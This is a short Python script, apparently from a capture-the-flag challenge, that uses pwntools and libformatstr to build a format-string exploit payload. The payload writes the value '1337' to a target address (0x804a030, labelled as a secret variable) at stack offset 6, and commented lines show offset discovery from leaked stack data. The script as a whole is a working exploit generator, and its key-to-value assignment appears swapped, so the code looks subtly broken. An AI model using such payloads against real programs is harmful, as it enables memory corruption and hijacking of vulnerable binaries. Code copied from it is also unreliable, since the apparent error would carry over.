import sys
from pwn import *
from libformatstr import *

bufsize = 100
buf = ""

#print make_pattern(bufsize)
#data = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab50xfff280440x2(nil)0xf75f69790xf77a5c900xfff29d460xfff29e840xfff29f8a0xf8bfbff0x7XX"

#offset, padding = guess_argnum(data, bufsize)

#print "Offset :" + str(offset)
#print "Padding :" + str(padding)

win_shell = 0x804a030         # Addr of Secret variable etc...
string = "1337"

p = FormatStr(bufsize)
p[string] = win_shell

buf += p.payload(6, 3)



print buf
